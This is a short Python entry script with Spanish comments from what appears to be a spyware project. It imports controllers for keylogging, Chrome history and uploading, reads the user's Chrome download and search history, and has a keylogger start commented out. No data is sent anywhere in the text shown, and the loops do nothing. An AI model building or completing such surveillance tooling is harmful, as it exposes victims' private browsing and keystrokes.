#!/usr/bin/env python3

from controller.FileSystemController    import FileSystemController
# from controller.KeyloggerController     import KeyloggerController
from controller.GoogleChromeController  import GoogleChromeController
# from controller.NetworkController       import NetworkController
# from controller.UploaderController      import UploaderController

import os

if __name__ == "__main__":

    fs_controller = FileSystemController()
    directorio_home = fs_controller.get_home_directory() 

    # [Done] Iniciamos el Keylogger
    # keylogger = KeyloggerController(interval=10)
    # keylogger.start()

    # 
    google_controller = GoogleChromeController()
    historial_de_descargas = google_controller.get_download_history()
    historial_de_busquedas = google_controller.get_serach_history()

    if historial_de_descargas:
        for fila in historial_de_descargas:
            # estos son los campos que importan target_path, start_time, tab_url sino referrer
            pass
    else:
        print("aaa")

    if historial_de_busquedas:
        for fila in historial_de_busquedas:
            # estos son los campos que importan term, url ejemplo print(fila['term'])
            pass
    else:
        print("No se obtuvieron resultados.")
